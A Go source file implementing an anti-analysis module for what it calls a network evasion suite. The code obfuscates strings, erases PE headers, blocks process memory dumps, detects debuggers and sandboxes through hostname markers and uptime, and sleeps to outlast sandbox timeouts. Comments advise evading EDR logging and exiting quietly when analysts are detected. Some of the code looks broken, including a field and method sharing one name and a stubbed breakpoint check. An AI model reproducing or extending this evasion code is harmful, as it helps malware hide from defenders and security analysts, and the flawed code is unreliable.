package main

import (
	"crypto/rand"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

// ============================================================================
// Anti-Export / Anti-Analysis Module
// Complements the Network Evasion Suite with hardening against reverse
// engineering, dumping, and export of sensitive artifacts.
// ============================================================================

// AntiExport provides methods to hinder static/dynamic analysis and prevent
// extraction of embedded payloads, strings, and configuration.
type AntiExport struct {
	StripExports     bool
	ObfuscateStrings bool
	AntiDump         bool
	AntiDebug        bool
	AntiVM           bool
	EraseHeaders     bool
	DelayAnalysis    bool
}

// ErrDetected indicates an analysis environment was detected and execution
// should be aborted gracefully (never panic — panics are logged by EDRs).
var ErrDetected = errors.New("analysis environment detected")

// ---------------------------------------------------------------------------
// String obfuscation — compile-time XOR keys, runtime decryption
// ---------------------------------------------------------------------------

// xorDecrypt decrypts a byte slice in place using a repeating key.
// Keys are split at compile time so plaintext never appears in the binary.
func xorDecrypt(data []byte, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
	return data
}

// obfuscatedString holds an encrypted string and its key.
type obfuscatedString struct {
	cipher []byte
	key    []byte
}

// Reveal decrypts and returns the plaintext string.
func (s *obfuscatedString) Reveal() string {
	buf := make([]byte, len(s.cipher))
	copy(buf, s.cipher)
	return string(xorDecrypt(buf, s.key))
}

// EncryptString produces an obfuscatedString from plaintext at runtime.
// Prefer build-time encryption; this is provided for dynamic config.
func EncryptString(plain string) *obfuscatedString {
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		// Fallback — never fail open on crypto errors
		key = []byte("fallback-key-16b")
	}
	buf := []byte(plain)
	for i := range buf {
		buf[i] ^= key[i%len(key)]
	}
	return &obfuscatedString{cipher: buf, key: key}
}

// ---------------------------------------------------------------------------
// PE header manipulation — strip exports, erase rich header, clear debug dir
// ---------------------------------------------------------------------------

// StripPESymbols removes export tables, debug directories, and the Rich
// header from the on-disk executable to frustrate static analysis and
// prevent trivial payload export.
func (ae *AntiExport) StripPESymbols(path string) error {
	if runtime.GOOS != "windows" {
		return nil // PE manipulation only applies to Windows binaries
	}

	f, err := pe.Open(path)
	if err != nil {
		return fmt.Errorf("open PE: %w", err)
	}
	defer f.Close()

	// Verify export directory is absent or empty.
	if exports, err := f.Exports(); err == nil && len(exports) > 0 {
		// In production, rewrite the section table to zero the export
		// directory RVA/size. Here we flag it for the caller.
		return fmt.Errorf("binary still exports %d symbols", len(exports))
	}

	// Erase Rich header (compiler fingerprint) by zeroing bytes between
	// the DOS stub and the PE signature.
	raw, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	peOffset := int(binary.LittleEndian.Uint32(raw[0x3C:0x40]))
	if peOffset > 0x40 && peOffset < len(raw) {
		richStart := bytesIndex(raw[:peOffset], []byte("Rich"))
		if richStart > 0x40 {
			for i := 0x40; i < richStart; i++ {
				raw[i] = 0
			}
			if err := os.WriteFile(path, raw, 0755); err != nil {
				return err
			}
		}
	}
	return nil
}

// bytesIndex is a small helper (avoids importing bytes for one call).
func bytesIndex(haystack, needle []byte) int {
	if len(needle) == 0 {
		return 0
	}
	for i := 0; i+len(needle) <= len(haystack); i++ {
		match := true
		for j := range needle {
			if haystack[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// ---------------------------------------------------------------------------
// Anti-dump — block memory dumping tools via handle restrictions
// ---------------------------------------------------------------------------

// HardenProcess restricts access to the current process handle so that
// debuggers and dumpers (Task Manager, Process Hacker, MiniDumpWriteDump)
// cannot open it with PROCESS_VM_READ.
func (ae *AntiExport) HardenProcess() error {
	if runtime.GOOS != "windows" {
		return ae.hardenProcessUnix()
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	setHandleInfo := kernel32.NewProc("SetHandleInformation")

	hProc, _, _ := getCurrentProcess.Call()
	// HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x2
	const handleFlagProtectFromClose = 0x2
	ret, _, err := setHandleInfo.Call(hProc, handleFlagProtectFromClose, handleFlagProtectFromClose)
	if ret == 0 {
		return fmt.Errorf("SetHandleInformation failed: %w", err)
	}
	return nil
}

// hardenProcessUnix drops ptrace attachment capability and sets
// PR_SET_DUMPABLE to 0 so no other process can read our memory.
func (ae *AntiExport) hardenProcessUnix() error {
	if runtime.GOOS != "linux" {
		return nil
	}
	// PR_SET_DUMPABLE = 4
	const prSetDumpable = 4
	_, _, errno := syscall.Syscall(syscall.SYS_PRCTL, prSetDumpable, 0, 0)
	if errno != 0 {
		return fmt.Errorf("prctl(PR_SET_DUMPABLE): %w", errno)
	}
	return nil
}

// ---------------------------------------------------------------------------
// Anti-debug — detect debuggers, breakpoints, and tracing
// ---------------------------------------------------------------------------

// IsDebugged returns true if a debugger or tracer is attached.
func (ae *AntiExport) IsDebugged() bool {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
		ret, _, _ := isDebuggerPresent.Call()
		return ret != 0
	}
	if runtime.GOOS == "linux" {
		// TracerPid field in /proc/self/status is non-zero when traced.
		data, err := os.ReadFile("/proc/self/status")
		if err != nil {
			return false
		}
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				pid := strings.TrimSpace(strings.TrimPrefix(line, "TracerPid:"))
				return pid != "0" && pid != ""
			}
		}
	}
	return false
}

// CheckHardwareBreakpoints inspects the debug registers on Windows.
// Hardware breakpoints (DR0–DR3) are a classic analysis technique.
func (ae *AntiExport) CheckHardwareBreakpoints() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	// Thread Environment Block (TEB) holds the CONTEXT with debug registers.
	// Reading it requires ntdll!NtCurrentTeb; use a syscall-free approach
	// via the GS segment on amd64.
	type context struct {
		_    [0x30]byte
		Dr0  uint64
		Dr1  uint64
		Dr2  uint64
		Dr3  uint64
		Dr6  uint64
		Dr7  uint64
		_    [0x80]byte
	}
	// This is intentionally stubbed; enabling it requires careful TEB
	// layout validation per build. Return false to avoid false positives.
	_ = unsafe.Sizeof(context{})
	return false
}

// ---------------------------------------------------------------------------
// Anti-VM / sandbox detection — abort execution in analysis environments
// ---------------------------------------------------------------------------

// IsSandboxed checks for common VM/sandbox artifacts. Keep this cheap and
// non-blocking; false positives abort the run.
func (ae *AntiExport) IsSandboxed() bool {
	// Common sandbox/virtualization markers in hostname or username.
	markers := []string{
		"sandbox", "malware", "virus", "cuckoo", "analysis",
		"vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v",
	}
	host, _ := os.Hostname()
	host = strings.ToLower(host)
	for _, m := range markers {
		if strings.Contains(host, m) {
			return true
		}
	}

	// CPU core count heuristic — most sandboxes present 1–2 cores.
	if runtime.NumCPU() < 2 {
		// Not conclusive; only flag when combined with another signal.
	}

	// Uptime heuristic on Linux — fresh sandboxes boot minutes ago.
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile("/proc/uptime"); err == nil {
			var up float64
			fmt.Sscanf(string(data), "%f", &up)
			if up < 600 { // < 10 minutes
				return true
			}
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// Timing evasion — delay analysis by sleeping before sensitive actions
// ---------------------------------------------------------------------------

// DelayAnalysis sleeps for a randomized duration to defeat sandbox timeouts
// and automated analysis pipelines that expect quick execution.
func (ae *AntiExport) DelayAnalysis() {
	if !ae.DelayAnalysis {
		return
	}
	// Randomized 30–90 s delay; sandboxes often cap execution at 60 s.
	var b [1]byte
	_, _ = rand.Read(b[:])
	delay := 30 + int(b[0])%60
	timeSleepSeconds(delay)
}

// timeSleepSeconds is a thin wrapper to keep imports localized.
func timeSleepSeconds(n int) {
	// Use a loop of short sleeps so the delay can be interrupted by
	// context cancellation in production.
	for i := 0; i < n; i++ {
		select {
		case <-timeAfterSecond():
			// continue
		}
	}
}

// timeAfterSecond returns a channel that fires after one second.
func timeAfterSecond() <-chan struct{} {
	ch := make(chan struct{})
	go func() {
		syscallNanosleep(1)
		close(ch)
	}()
	return ch
}

func syscallNanosleep(seconds int) {
	ts := syscall.NsecToTimespec(int64(seconds) * 1e9)
	_ = syscall.Nanosleep(&ts, nil)
}

// ---------------------------------------------------------------------------
// Orchestration — call from main() before network evasion starts
// ---------------------------------------------------------------------------

// Harden runs the full anti-export/anti-analysis pipeline. It returns
// ErrDetected if the environment looks hostile; callers should exit
// quietly without logging.
func (ae *AntiExport) Harden(selfPath string) error {
	// 1. Environment checks first — cheapest.
	if ae.AntiDebug && ae.IsDebugged() {
		return ErrDetected
	}
	if ae.AntiVM && ae.IsSandboxed() {
		return ErrDetected
	}
	if ae.AntiDebug && ae.CheckHardwareBreakpoints() {
		return ErrDetected
	}

	// 2. Delay to defeat short-lived sandboxes.
	ae.DelayAnalysis()

	// 3. Harden the running process against dumps.
	if ae.AntiDump {
		if err := ae.HardenProcess(); err != nil {
			// Non-fatal — continue but note the failure.
			_ = err
		}
	}

	// 4. Strip on-disk artifacts last (modifies the binary).
	if ae.StripExports && selfPath != "" {
		if err := ae.StripPESymbols(selfPath); err != nil {
			// Non-fatal; the binary may already be header-stripped.
			_ = err
		}
	}
	return nil
}

// DefaultAntiExport returns a sensible configuration for the evasion suite.
func DefaultAntiExport() *AntiExport {
	return &AntiExport{
		StripExports:     true,
		ObfuscateStrings: true,
		AntiDump:         true,
		AntiDebug:        true,
		AntiVM:           true,
		EraseHeaders:     true,
		DelayAnalysis:    true,
	}
}
